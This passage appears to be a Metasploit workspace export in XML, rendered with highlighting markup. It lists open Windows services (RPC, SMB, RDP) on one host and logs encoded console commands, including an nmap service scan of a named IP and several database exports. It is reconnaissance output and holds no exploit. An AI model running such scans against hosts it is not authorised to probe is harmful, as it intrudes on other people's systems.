      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49157<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>services</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>notes</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>notes</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>vulns</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>vulns</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hosts</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>events</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:23:38 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:23:38 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoNcmV2aXNpb24iDyRSZXZpc2lvbiQ=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:23:38 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:23:38 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCILYmFubmVy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:23:42 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:23:42 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCIOZGJfc3RhdHVz<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:25:22 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:25:22 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCIhZGJfbm1hcCAtUG4gLXNWIDE5Mi4zMy42LjE1MQ==<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:27:27 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:27:27 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCIKaG9zdHM=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:28:41 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:28:41 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCIRZGJfZXhwb3J0IC1o<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:29:03 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:29:03 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCIbZGJfZXhwb3J0IC1mIHR4dCAxLnR4dA==<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>event</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workspace-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workspace-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:29:14 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ui_command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:29:14 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>critical</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>seen</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>BAh7BjoMY29tbWFuZCIXZGJfZXhwb3J0IC1mIHhtbCAx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>event</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>events</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>services</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>135<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>139<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>netbios-ssn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows netbios-ssn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>445<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>microsoft-ds<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>3389<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>ms-wbt-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
